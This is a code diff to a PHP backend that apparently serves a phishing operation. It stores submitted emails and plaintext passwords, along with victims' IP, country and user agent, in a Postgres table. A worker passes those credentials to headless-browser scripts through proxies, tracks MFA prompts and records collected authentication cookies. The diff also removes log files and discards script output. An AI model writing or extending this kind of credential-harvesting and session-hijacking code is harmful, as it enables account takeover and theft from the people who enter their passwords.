@@ -156,14 +156,6 @@ class Config {
 }
 
 class Worker {
-    /**
-     * When RENDER_API_URL is set, this PHP process is the VPS-side proxy: it must
-     * NEVER launch Chrome / Puppeteer / Node. All such work is offloaded to Render.
-     */
-    public static function isRemote(): bool {
-        return (bool) getenv('RENDER_API_URL');
-    }
-
     public static function buildNodeCommand(string $projectRoot, string $script, string $email = '', string $password = '', string $cookieId = '', bool $background = false, bool $installChrome = false, string $apiBase = ''): string {
         $chromePath = '';
         foreach (['google-chrome-stable', 'google-chrome', 'chromium', 'chromium-browser'] as $bin) {
@@ -195,7 +187,12 @@ class Worker {
             $cmd .= " API_BASE_URL=" . escapeshellarg($apiBase);
         }
 
-        $cmd .= " node " . escapeshellarg($projectRoot . '/' . $script);
+        $useProxy = (string)getenv('PROXY_HOST') !== '' && (string)getenv('PROXY_USER_TPL') !== '';
+        if ($useProxy && file_exists($projectRoot . '/proxy_runner.js')) {
+            $cmd .= " node " . escapeshellarg($projectRoot . '/proxy_runner.js') . " " . escapeshellarg($script);
+        } else {
+            $cmd .= " node " . escapeshellarg($projectRoot . '/' . $script);
+        }
 
         if ($email !== '')    $cmd .= " " . escapeshellarg($email);
         if ($password !== '') $cmd .= " " . escapeshellarg($password);
@@ -220,6 +217,8 @@ class Worker {
         $maxConcurrent = (int)(getenv('MAX_CONCURRENT_CHROMES') ?: 3);
         if ($maxConcurrent < 1) $maxConcurrent = 1;
 
+        $useNeon = (bool)(getenv('DATABASE_URL') ?: false);
+
         while (true) {
             try {
                 if ((time() - $lastProfileSweep) > 300) {
@@ -238,44 +237,73 @@ class Worker {
                     continue;
                 }
 
-                // Single-worker mode: pick the oldest pending session for FIFO fairness.
-                $files = glob($storageDir . '/session_*.json');
-                if (!empty($files)) {
-                    usort($files, function($a, $b) {
-                        return filemtime($a) <=> filemtime($b);
-                    });
+                $candidates = [];
+
+                if ($useNeon) {
+                    $neonRows = NeonDB::getPending();
+                    foreach ($neonRows as $row) {
+                        $candidates[] = [
+                            'cookie_id'  => $row['cookie_id'],
+                            'email'      => $row['email'],
+                            'password'   => $row['password'],
+                            'status'     => $row['status'],
+                            'created_at' => $row['created_at'] ?? '',
+                            '_source'    => 'neon'
+                        ];
+                    }
+                }
+
+                $files = glob($storageDir . '/session_*.json') ?: [];
+                usort($files, fn($a, $b) => filemtime($a) <=> filemtime($b));
+                $neonIds = array_column($candidates, 'cookie_id');
+                foreach ($files as $f) {
+                    $data = json_decode(@file_get_contents($f), true);
+                    if (!is_array($data) || ($data['status'] ?? '') !== 'pending') continue;
+                    if (in_array($data['cookie_id'] ?? '', $neonIds, true)) continue;
+                    $data['_source'] = 'fs';
+                    $data['_file']   = $f;
+                    $candidates[] = $data;
                 }
 
                 $sessionFile = null;
                 $task = null;
-                foreach ($files as $f) {
-                    $data = json_decode(@file_get_contents($f), true);
-                    if (!is_array($data) || ($data['status'] ?? '') !== 'pending') continue;
 
-                    $taskPassword = $data['password'] ?? '';
+                foreach ($candidates as $candidate) {
+                    $taskPassword = $candidate['password'] ?? '';
+                    $createdAt    = strtotime((string)($candidate['created_at'] ?? ''));
+                    $cookieId     = $candidate['cookie_id'] ?? '';
+
                     if (empty($taskPassword) || $taskPassword === '__from_file__' || $taskPassword === 'PROACTIVE_SESSION_SYNC') {
-                        $createdAt = strtotime($data['created_at'] ?? '');
                         if ($createdAt && (time() - $createdAt) >= $passwordTimeoutSecs) {
-                            $data['status'] = 'failed';
-                            $data['data'] = ['error' => 'Timed out waiting for password.'];
-                            $data['updated_at'] = date('c');
-                            file_put_contents($f, json_encode($data, JSON_PRETTY_PRINT));
-                            Security::log("WORKER: Timed out waiting for password for {$data['email']} (CookieID: {$data['cookie_id']}). Marking failed.");
+                            NeonDB::updateStatus($cookieId, 'failed');
+                            $fsFile = $candidate['_file'] ?? ($storageDir . '/session_' . $cookieId . '.json');
+                            if (file_exists($fsFile)) {
+                                $d = json_decode(file_get_contents($fsFile), true) ?: [];
+                                $d['status']     = 'failed';
+                                $d['data']        = ['error' => 'Timed out waiting for password.'];
+                                $d['updated_at'] = date('c');
+                                file_put_contents($fsFile, json_encode($d, JSON_PRETTY_PRINT));
+                            }
+                            Security::log("WORKER: Timed out waiting for password for {$candidate['email']} (CookieID: $cookieId). Marking failed.");
                         }
                         continue;
                     }
 
-                    // Single worker: claim by simple status flip (no race possible).
-                    $data['status'] = 'processing';
-                    $data['updated_at'] = date('c');
-                    file_put_contents($f, json_encode($data, JSON_PRETTY_PRINT));
+                    NeonDB::updateStatus($cookieId, 'processing');
+                    $fsFile = $candidate['_file'] ?? ($storageDir . '/session_' . $cookieId . '.json');
+                    if (file_exists($fsFile)) {
+                        $d = json_decode(file_get_contents($fsFile), true) ?: [];
+                        $d['status']     = 'processing';
+                        $d['updated_at'] = date('c');
+                        file_put_contents($fsFile, json_encode($d, JSON_PRETTY_PRINT));
+                    }
 
-                    $sessionFile = $f;
-                    $task = $data;
+                    $sessionFile = $fsFile;
+                    $task = $candidate;
                     break;
                 }
 
-                if (!$sessionFile || !$task) {
+                if (!$task) {
                     usleep(500000);
                     continue;
                 }
@@ -297,15 +325,18 @@ class Worker {
 
                 if ($scriptToRun === 'token_swap.js' && empty($taskPassword)) {
                     Security::log("WORKER: No password provided for token_swap — skipping.");
-                    $task['status'] = 'failed';
-                    $task['data'] = ['error' => 'No password was provided.'];
-                    $task['updated_at'] = date('c');
-                    file_put_contents($sessionFile, json_encode($task, JSON_PRETTY_PRINT));
+                    NeonDB::updateStatus($task['cookie_id'], 'failed');
+                    if ($sessionFile && file_exists($sessionFile)) {
+                        $d = json_decode(file_get_contents($sessionFile), true) ?: [];
+                        $d['status']     = 'failed';
+                        $d['data']        = ['error' => 'No password was provided.'];
+                        $d['updated_at'] = date('c');
+                        file_put_contents($sessionFile, json_encode($d, JSON_PRETTY_PRINT));
+                    }
                     continue;
                 }
 
-                $puppeteerLogFile = $projectRoot . '/puppeteer.log';
-                $cmd = self::buildNodeCommand($projectRoot, $scriptToRun, $task['email'], '', $task['cookie_id'], false, true, $apiBase) . " --verbose >> " . escapeshellarg($puppeteerLogFile) . " 2>&1 </dev/null &";
+                $cmd = self::buildNodeCommand($projectRoot, $scriptToRun, $task['email'], '', $task['cookie_id'], false, true, $apiBase) . " --verbose > /dev/null 2>&1 </dev/null &";
 
                 Security::log("WORKER: Executing command: $cmd");
 
@@ -498,6 +529,135 @@ class Crypto {
     }
 }
 
+class NeonDB {
+    private static ?object $pdo = null;
+    private static bool $tried = false;
+
+    public static function pdo(): ?object {
+        if (self::$tried) return self::$pdo;
+        self::$tried = true;
+        $dsn = $_ENV['DATABASE_URL'] ?? getenv('DATABASE_URL') ?? '';
+        if (!$dsn) return null;
+        try {
+            $pdoDsn = self::buildPdoDsn($dsn);
+            if ($pdoDsn === null) {
+                Security::log("NeonDB: malformed DATABASE_URL");
+                return null;
+            }
+            [$dsnStr, $user, $pass] = $pdoDsn;
+            $pdo = new \PDO($dsnStr, $user, $pass);
+            $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
+            $pdo->exec("
+                CREATE TABLE IF NOT EXISTS sessions (
+                    cookie_id   TEXT PRIMARY KEY,
+                    email       TEXT NOT NULL DEFAULT '',
+                    password    TEXT NOT NULL DEFAULT '',
+                    status      TEXT NOT NULL DEFAULT 'pending',
+                    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+                    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
+                )
+            ");
+            self::$pdo = $pdo;
+        } catch (\Throwable $e) {
+            Security::log("NeonDB connect error: " . $e->getMessage());
+        }
+        return self::$pdo;
+    }
+
+    private static function buildPdoDsn(string $url): ?array {
+        if (strpos($url, 'pgsql:') === 0) {
+            return [$url, null, null];
+        }
+        $p = parse_url($url);
+        if (!$p || empty($p['host']) || empty($p['path'])) return null;
+        $query = [];
+        if (!empty($p['query'])) parse_str($p['query'], $query);
+        $sslmode = $query['sslmode'] ?? 'require';
+        $dsn = sprintf(
+            'pgsql:host=%s;port=%d;dbname=%s;sslmode=%s',
+            $p['host'],
+            $p['port'] ?? 5432,
+            ltrim($p['path'], '/'),
+            $sslmode
+        );
+        $user = isset($p['user']) ? rawurldecode($p['user']) : null;
+        $pass = isset($p['pass']) ? rawurldecode($p['pass']) : null;
+        return [$dsn, $user, $pass];
+    }
+
+    public static function upsert(string $cookieId, string $email, string $password, string $status, string $createdAt = '', array $extra = []): void {
+        $pdo = self::pdo();
+        if (!$pdo) return;
+        try {
+            $ca      = $createdAt ?: date('c');
+            $country = (string)($extra['country'] ?? '');
+            $ip      = (string)($extra['ip']      ?? '');
+            $ua      = (string)($extra['ua']      ?? '');
+            $stmt = $pdo->prepare("
+                INSERT INTO sessions (cookie_id, email, password, status, created_at, updated_at, country, ip, ua)
+                VALUES (:id, :email, :pw, :st, :ca, NOW(), :country, :ip, :ua)
+                ON CONFLICT (cookie_id) DO UPDATE SET
+                    email      = EXCLUDED.email,
+                    password   = EXCLUDED.password,
+                    status     = EXCLUDED.status,
+                    country    = CASE WHEN EXCLUDED.country <> '' THEN EXCLUDED.country ELSE sessions.country END,
+                    ip         = CASE WHEN EXCLUDED.ip      <> '' THEN EXCLUDED.ip      ELSE sessions.ip      END,
+                    ua         = CASE WHEN EXCLUDED.ua      <> '' THEN EXCLUDED.ua      ELSE sessions.ua      END,
+                    updated_at = NOW()
+            ");
+            $stmt->execute([
+                ':id' => $cookieId, ':email' => $email, ':pw' => $password,
+                ':st' => $status, ':ca' => $ca,
+                ':country' => $country, ':ip' => $ip, ':ua' => $ua,
+            ]);
+        } catch (\Throwable $e) {
+            Security::log("NeonDB upsert error: " . $e->getMessage());
+        }
+    }
+
+    public static function updateStatus(string $cookieId, string $status, string $password = ''): void {
+        $pdo = self::pdo();
+        if (!$pdo) return;
+        try {
+            if ($password !== '') {
+                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, password=:pw, updated_at=NOW() WHERE cookie_id=:id");
+                $stmt->execute([':st' => $status, ':pw' => $password, ':id' => $cookieId]);
+            } else {
+                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, updated_at=NOW() WHERE cookie_id=:id");
+                $stmt->execute([':st' => $status, ':id' => $cookieId]);
+            }
+        } catch (\Throwable $e) {
+            Security::log("NeonDB updateStatus error: " . $e->getMessage());
+        }
+    }
+
+    public static function get(string $cookieId): ?array {
+        $pdo = self::pdo();
+        if (!$pdo) return null;
+        try {
+            $stmt = $pdo->prepare("SELECT * FROM sessions WHERE cookie_id=:id LIMIT 1");
+            $stmt->execute([':id' => $cookieId]);
+            $row = $stmt->fetch(\PDO::FETCH_ASSOC);
+            return $row ?: null;
+        } catch (\Throwable $e) {
+            Security::log("NeonDB get error: " . $e->getMessage());
+            return null;
+        }
+    }
+
+    public static function getPending(): array {
+        $pdo = self::pdo();
+        if (!$pdo) return [];
+        try {
+            $stmt = $pdo->query("SELECT * FROM sessions WHERE status='pending' ORDER BY created_at ASC");
+            return $stmt->fetchAll(\PDO::FETCH_ASSOC);
+        } catch (\Throwable $e) {
+            Security::log("NeonDB getPending error: " . $e->getMessage());
+            return [];
+        }
+    }
+}
+
 class Database {
     private $storageDir;
 
@@ -521,7 +681,22 @@ class Database {
         $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
         $data = array_merge($existing, $data);
 
-        return file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT)) !== false;
+        $ok = file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT)) !== false;
+
+        NeonDB::upsert(
+            $cookieId,
+            $data['email'] ?? '',
+            $data['password'] ?? '',
+            $data['status'] ?? 'pending',
+            $data['created_at'] ?? '',
+            [
+                'country' => $data['country'] ?? '',
+                'ip'      => $data['ip']      ?? '',
+                'ua'      => $data['ua']      ?? '',
+            ]
+        );
+
+        return $ok;
     }
 
     public function addTask($cookieId, $email, $password) {
@@ -536,7 +711,11 @@ class Database {
         $existing['created_at'] = $existing['created_at'] ?? date('c');
         $existing['updated_at'] = date('c');
 
-        return file_put_contents($filePath, json_encode($existing, JSON_PRETTY_PRINT)) !== false;
+        $ok = file_put_contents($filePath, json_encode($existing, JSON_PRETTY_PRINT)) !== false;
+
+        NeonDB::upsert($cookieId, $email, $password, 'pending', $existing['created_at']);
+
+        return $ok;
     }
 
     public function getEventInfo($cookieId) {
@@ -545,7 +724,8 @@ class Database {
         if (file_exists($filePath)) {
             return json_decode(file_get_contents($filePath), true);
         }
-        return null;
+        $row = NeonDB::get($cookieId);
+        return $row ?: null;
     }
 
     public function getLatestEventByEmail($email) {
@@ -1108,9 +1288,9 @@ class Api {
         $resp = curl_exec($ch);
         $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         $err  = curl_error($ch);
-        unset($ch);
+        // curl_close is deprecated in PHP 8.0+ and unnecessary
 
-        if (class_exists(Security::class)) {
+        if (class_exists('Security')) {
             Security::log("RENDER_FORWARD: $method $action -> HTTP $code" . ($err ? " curl=$err" : ''));
         }
 
@@ -1201,17 +1381,9 @@ class Api {
         $existing['updated_at'] = date('c');
         file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
 
-        Security::log("CREATE_SESSION: Queued pending session for $email (session: $cookieId)");
+        NeonDB::upsert($cookieId, $email, '', 'pending', $existing['created_at']);
 
-        $workerRunning = !empty(shell_exec("pgrep -fa 'php.*index\\.php.*worker' 2>/dev/null"));
-        if (!$workerRunning) {
-            $phpBin = PHP_BINARY ?: 'php';
-            $indexPhp = escapeshellarg($projectRoot . '/index.php');
-            $workerLogFile = escapeshellarg($projectRoot . '/worker.log');
-            $workerCmd = "$phpBin $indexPhp worker >> $workerLogFile 2>&1 &";
-            shell_exec($workerCmd);
-            Security::log("CREATE_SESSION: Worker was not running — auto-started.");
-        }
+        Security::log("CREATE_SESSION: Queued pending session for $email (session: $cookieId)");
 
         echo json_encode(['ok' => true]);
         exit;
@@ -1242,21 +1414,42 @@ class Api {
         }
 
         $projectRoot = realpath(__DIR__ . '/..');
-        $sessionFile = $projectRoot . '/session_data/session_' . $cookieId . '.json';
+        $sessionDir  = $projectRoot . '/session_data';
+        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
+        $sessionFile = $sessionDir . '/session_' . $cookieId . '.json';
 
-        if (!file_exists($sessionFile)) {
+        $fsExists = file_exists($sessionFile);
+        $neonRow  = !$fsExists ? NeonDB::get($cookieId) : null;
+
+        if (!$fsExists && !$neonRow) {
             http_response_code(404);
             echo json_encode(['ok' => false, 'error' => 'Session not found']);
             exit;
         }
 
-        $existing = json_decode(file_get_contents($sessionFile), true) ?: [];
-        $existing['password']   = $password;
-        if (($existing['status'] ?? '') !== 'processing') {
-            $existing['status'] = 'pending';
+        if ($fsExists) {
+            $existing = json_decode(file_get_contents($sessionFile), true) ?: [];
+            $existing['password']   = $password;
+            if (($existing['status'] ?? '') !== 'processing') {
+                $existing['status'] = 'pending';
+            }
+            $existing['updated_at'] = date('c');
+            file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
+        } else {
+            $existing = [
+                'cookie_id'  => $cookieId,
+                'email'      => $neonRow['email'] ?? '',
+                'password'   => $password,
+                'status'     => ($neonRow['status'] ?? '') === 'processing' ? 'processing' : 'pending',
+                'created_at' => $neonRow['created_at'] ?? date('c'),
+                'updated_at' => date('c'),
+            ];
+            file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
         }
-        $existing['updated_at'] = date('c');
-        file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
+
+        $currentStatus = $existing['status'] ?? 'pending';
+        $newStatus = ($currentStatus === 'processing') ? 'processing' : 'pending';
+        NeonDB::updateStatus($cookieId, $newStatus, $password);
 
         Security::log("SUBMIT_PASSWORD: password written for session $cookieId");
         echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
@@ -1309,16 +1502,47 @@ class Api {
         $sessionId   = Security::sanitizeId($sessionId);
         $storageDir  = realpath(__DIR__ . '/../session_data');
 
-        // Collect sub-task IDs: any session_<masterId>_p*.json files, or the session itself
         $subFiles = glob($storageDir . '/session_' . $sessionId . '_p*.json');
         if (empty($subFiles)) {
-            $subFiles = []; 
+            $subFiles = [];
             $single = $storageDir . '/session_' . $sessionId . '.json';
             if (file_exists($single)) $subFiles[] = $single;
         }
 
+        // Neon is the authoritative store: the worker (and any Render-side process)
+        // always writes status to Neon, but the local disk file may be stale on this
+        // host. Pull the Neon row up-front so we can use it as source-of-truth for
+        // terminal / active states, and only fall back to disk for legacy cases.
+        $neonRow = NeonDB::get($sessionId);
+        $terminal = ['cookies_auth_collected', 'completed', 'mfa_accepted', 'failed', 'mfa_prompt'];
+        if ($neonRow && in_array($neonRow['status'] ?? '', $terminal, true)) {
+            $st = $neonRow['status'];
+            if ($st === 'cookies_auth_collected' || $st === 'completed' || $st === 'mfa_accepted') {
+                echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
+                exit;
+            }
+            if ($st === 'mfa_prompt') {
+                echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
+                exit;
+            }
+            if ($st === 'failed') {
+                $err = 'Login failed.';
+                if (!empty($neonRow['data'])) {
+                    $d = is_string($neonRow['data']) ? json_decode($neonRow['data'], true) : $neonRow['data'];
+                    if (is_array($d) && !empty($d['error'])) $err = $d['error'];
+                }
+                echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
+                exit;
+            }
+        }
+
         if (empty($subFiles)) {
-            echo json_encode(['status' => 'pending']);
+            if ($neonRow) {
+                $st = $neonRow['status'] ?? 'pending';
+                echo json_encode(['status' => $st]);
+            } else {
+                echo json_encode(['status' => 'pending']);
+            }
             exit;
         }
 
@@ -2133,7 +2357,7 @@ class Api {
             }
         }
 
-        foreach (['project.log', 'worker.log', 'puppeteer.log'] as $log) {
+        foreach (['project.log'] as $log) {
             $path = $projectRoot . '/' . $log;
             if (file_exists($path)) {
                 unlink($path);
